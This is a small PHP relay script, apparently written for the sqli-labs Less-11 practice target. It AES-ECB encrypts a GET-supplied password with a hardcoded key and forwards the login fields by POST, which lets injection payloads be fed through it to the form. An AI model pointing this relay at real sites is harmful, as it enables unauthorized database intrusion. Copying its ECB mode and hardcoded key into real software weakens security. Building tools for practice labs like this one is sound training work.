<?php
$param1 = $_GET['param1'];
$param2 = $_GET['param2'];

$key = "akcdefg3bcdkffff";   //设置加密密钥


$block_size = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_ECB);   //加密模式

//设置$param2的填充方式,PKCS#7填充也称为PKCS#5
$pad_size = $block_size - (strlen($param2) % $block_size);
$param2 .= str_repeat(chr($pad_size), $pad_size);

//参数加密
$param2 = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $param2, MCRYPT_MODE_ECB);

// 对密文进行base64
$param2_base64 = base64_encode($param2);

// 设置POST请求中的参数,需要注意传参的个数以及名称
$sub = "Submit";
$data = array(
    'uname' => $param1,   //对应用户名的参数名
    'passwd' => $param2_base64,  //对应密码的参数名
    'submit' => $sub      //第三个参数，再数组外赋值后带入
);

//向目标网站发送post请求
// 设置POST请求的URL和请求头信息
$url = 'http://10.10.70.109/sqli/Less-11/index.php';   //目标 URL
$headers = array(                             //请求头根据需求自加自减
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
);

// 初始化curl
$ch = curl_init();

// 设置curl的相关参数
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// 执行curl请求
$response = curl_exec($ch);

// 关闭curl资源
curl_close($ch);

// 输出响应结果
echo $response;
?>